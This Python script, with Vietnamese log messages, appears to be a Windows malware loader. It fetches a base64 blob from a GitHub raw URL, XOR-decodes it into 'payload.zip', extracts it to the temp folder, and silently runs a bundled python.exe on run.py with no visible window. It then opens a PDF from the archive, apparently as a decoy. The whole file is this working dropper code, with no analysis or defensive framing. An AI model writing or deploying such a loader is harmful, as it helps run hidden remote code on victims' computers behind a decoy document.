import os
import base64
import zipfile
import tempfile
import subprocess
import ctypes
import requests
import logging
import sys

# Fix encoding UTF-8
if sys.platform.startswith('win'):
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')

LOG_PATH = os.path.join(tempfile.gettempdir(), "unzip_debug.log")
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler(LOG_PATH, encoding='utf-8'), logging.StreamHandler(sys.stdout)])

def show_error(title, message):
    logging.error(f"{title}: {message}")
    ctypes.windll.user32.MessageBoxW(0, f"{message}\nLog: {LOG_PATH}", title, 0x10)

logging.info("Bắt đầu")

TXT_URL = "https://raw.githubusercontent.com/bangwonie/textcode/main/testaduy_base64.txt"  # Repo của bạn
XOR_KEY = 0x5A

def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

USER_TEMP = tempfile.gettempdir()
TEMP_ROOT = USER_TEMP
UNPACKED_DIR = os.path.join(TEMP_ROOT, "pyembed_unpacked")
ZIP_PATH = os.path.join(TEMP_ROOT, "payload.zip")
logging.info(f"Temp: {TEMP_ROOT}")

def find_file(root, filename):
    for p, d, f in os.walk(root):
        if filename in f:
            full_path = os.path.join(p, filename)
            logging.info(f"Tìm thấy {filename}: {full_path}")
            return full_path
    logging.warning(f"Không {filename}")
    return None

def find_pdf(root):
    for p, d, f in os.walk(root):
        for file in f:
            if file.lower().endswith(".pdf"):
                full_path = os.path.join(p, file)
                logging.info(f"Tìm thấy PDF: {full_path}")
                return full_path
    logging.warning("Không PDF")
    return None

try:
    logging.info(f"Tải URL: {TXT_URL}")
    response = requests.get(TXT_URL, timeout=10)
    response.raise_for_status()
    BASE64_DATA = response.text.strip()
    logging.info(f"Tải OK, len: {len(BASE64_DATA)}")

    if not BASE64_DATA:
        raise ValueError("Base64 rỗng")

    os.makedirs(TEMP_ROOT, exist_ok=True)
    os.makedirs(UNPACKED_DIR, exist_ok=True)
    logging.info("Tạo temp OK")

    logging.info("Decode...")
    base64_raw = base64.b64decode(BASE64_DATA)
    logging.info(f"Decode OK, len: {len(base64_raw)}")

    logging.info("XOR...")
    zip_bytes = xor_bytes(base64_raw, XOR_KEY)
    logging.info("XOR OK")

    logging.info(f"Ghi ZIP: {ZIP_PATH}")
    with open(ZIP_PATH, "wb") as f:
        f.write(zip_bytes)
    logging.info("Ghi ZIP OK")

    logging.info("Extract...")
    with zipfile.ZipFile(ZIP_PATH, "r") as z:
        z.extractall(UNPACKED_DIR)
    logging.info("Extract OK")
    os.remove(ZIP_PATH)
    logging.info("Xóa ZIP OK")

    python_path = find_file(UNPACKED_DIR, "python.exe")
    run_path = find_file(UNPACKED_DIR, "run.py")
    pdf_path = find_pdf(UNPACKED_DIR)

    if not python_path:
        raise FileNotFoundError("Không python.exe")
    if not run_path:
        raise FileNotFoundError("Không run.py")

    logging.info(f"Chạy run.py: {python_path} {run_path}")
    CREATE_NO_WINDOW = 0x08000000
    proc = subprocess.Popen([python_path, run_path], creationflags=CREATE_NO_WINDOW,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    proc.wait()
    logging.info("run.py OK")

    if pdf_path:
        logging.info(f"Mở PDF: {pdf_path}")
        try:
            os.startfile(pdf_path)
            logging.info("PDF OK (startfile)")
        except PermissionError:
            logging.warning("startfile fail - fallback")
            try:
                subprocess.run(['start', '', pdf_path], shell=True, check=True)
                logging.info("PDF OK (fallback)")
            except Exception as e2:
                show_error("Lỗi PDF fallback", str(e2))
        except Exception as e:
            show_error("Lỗi PDF", str(e))
    else:
        logging.warning("Không PDF")

    logging.info("Hoàn thành OK")

except requests.exceptions.RequestException as e:
    show_error("Lỗi Network", str(e))
except Exception as e:
    show_error("Lỗi chung", str(e))
finally:
    logging.info("Kết thúc")